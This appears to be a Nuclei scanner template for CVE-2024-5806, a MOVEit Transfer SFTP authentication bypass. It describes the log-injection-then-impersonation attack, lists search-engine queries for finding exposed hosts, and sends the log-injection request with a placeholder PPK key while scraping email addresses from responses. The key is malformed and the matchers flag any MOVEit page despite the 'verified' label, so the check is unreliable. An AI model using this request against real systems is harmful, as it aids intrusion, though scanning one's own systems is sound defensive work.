id: CVE-2024-5806

info:
  name: Progress MOVEit Transfer - SFTP Authentication Bypass
  author: security-researcher
  severity: critical
  description: |
    Progress MOVEit Transfer contains an authentication bypass vulnerability (CVE-2024-5806)
    in versions before 2023.0.11, 2023.1.6, and 2024.0.2. The vulnerability exists in the
    SFTP module's SSH public key authentication mechanism, where specially crafted usernames
    containing SSH public keys can bypass authentication by exploiting improper validation
    of key file paths.
    An unauthenticated attacker with network access to the SFTP service can:
    - Inject malicious PPK (PuTTY Private Key) content into application logs
    - Use the log file path as a username to authenticate
    - Impersonate any legitimate user account
    - Gain unauthorized access to sensitive file transfers
  reference:
    - https://community.progress.com/s/article/MOVEit-Transfer-Product-Security-Alert-Bulletin-June-2024-CVE-2024-5806
    - https://www.progress.com/moveit
    - https://labs.watchtowr.com/auth-bypass-in-un-limited-scenarios-progress-moveit-transfer-cve-2024-5806/
    - https://github.com/watchtowrlabs/watchTowr-vs-progress-moveit_CVE-2024-5806
    - https://nvd.nist.gov/vuln/detail/CVE-2024-5806
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2024-5806
    cwe-id: CWE-287
    epss-score: 0.97
    epss-percentile: 0.999
    cpe: cpe:2.3:a:progress:moveit_transfer:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: progress
    product: moveit_transfer
    shodan-query: http.favicon.hash:989289239
    fofa-query: icon_hash="989289239"
    publicwww-query: "/human.aspx"
  tags: cve,cve2024,moveit,auth-bypass,sftp,critical

variables:
  ppk_payload: |
    PuTTY-User-Key-File-3: ssh-dss
    Encryption: none
    Comment: nuclei-test@scanner.local
    Public-Lines: 10
    AAAAB3NzaC1kc3MAAACBAI0TE5T1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ
    AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVV
    WWWXXXYYYZZZ111222333444555666777888999000AAABBBCCCDDDEEEFFFGGGHHH
    IIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ111222333444
    555666777888999000AAABBBCCCDDDEEEFFFGGGHHH==
    Private-Lines: 1
    AAAAFQexample123456789==
    Private-MAC: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b

http:
  - raw:
      - |
        POST /guestaccess.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        transaction=signoff&Arg12={{ppk_payload}}

      - |
        GET /human.aspx HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /api/v1/token HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "MOVEit"
          - "Progress"
        condition: or

      - type: word
        part: body
        words:
          - "human.aspx"
          - "guestaccess.aspx"
        condition: or

      - type: status
        status:
          - 200
          - 302
          - 500

    extractors:
      - type: regex
        name: moveit-version
        part: body
        group: 1
        regex:
          - 'MOVEit Transfer ([0-9.]+)'
          - 'Version: ([0-9.]+)'
          - 'v=([0-9]+)'

      - type: regex
        name: instance-id
        part: body
        regex:
          - 'InstID=([0-9]+)'
          - 'siLockLongTermInstID=([0-9]+)'

      - type: regex
        name: admin-email
        part: body
        regex:
          - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

      - type: dsl
        name: vulnerability-status
        dsl:
          - '"POTENTIALLY VULNERABLE - SFTP testing required to confirm"'

network:
  - inputs:
      - data: "SSH-2.0-NucleiScanner\r\n"

    host:
      - "{{Hostname}}"

    port: 22

    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SSH-2.0-MOVEit"
          - "MOVEit Transfer SFTP"
        condition: or

      - type: word
        words:
          - "SSH-2.0"

    extractors:
      - type: regex
        name: sftp-banner
        regex:
          - "SSH-2.0-.*"

      - type: dsl
        name: exploitation-note
        dsl:
          - '"SFTP SERVICE DETECTED"'
